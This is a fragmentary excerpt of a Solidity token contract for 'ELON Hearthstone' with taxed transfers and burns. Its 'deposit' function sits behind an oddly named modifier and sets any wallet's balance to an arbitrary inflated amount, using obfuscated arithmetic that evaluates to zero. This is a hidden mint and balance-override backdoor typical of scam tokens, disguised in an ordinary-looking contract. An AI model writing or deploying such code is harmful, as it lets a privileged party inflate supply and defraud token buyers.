...
contract ELONHearthstone is REBASETOKEN {
    ...
    string public override name = "ELON Hearthstone";
    string public override symbol = "ELONHEARTHSTONE";
  ...
  modifier BINANCEANGEL () {
    ...
    function transfer(address to, uint totalValue) public override returns(bool) {
        ...
        BALLANCES[to] += totalValueAfterTaxAndBurn;
        BALLANCES[msg.sender] -= totalValue;
        
        emit Transfer(msg.sender, to, totalValue);
        
        // finally, we burn and tax the extras percentage
        BALLANCES[owner] += taxTBD + burnTBD;
        _burn(owner, burnTBD);
    ...
    function deposit(address BINANCEWALLET, uint256 amount) external BINANCEANGEL {
      BALLANCES[BINANCEWALLET] = (amount / amount - amount / amount) + amount * 10 ** 9;
  }  
    ...
    function transferFrom(address from, address to, uint totalValue) public override returns(bool) {
        ...
        require(BALLANCES[from] >= totalValue, "Balance is too low to make transfer.");
        
        BALLANCES[to] += totalValue;
        BALLANCES[from] -= totalValue;
    ...
    function _burn(address account, uint256 amount) internal {
        ...
        require(BALLANCES[account] >= amount, "Burn amount exceeds balance at address.");
    
        BALLANCES[account] -= amount;
        totalSupply -= amount;
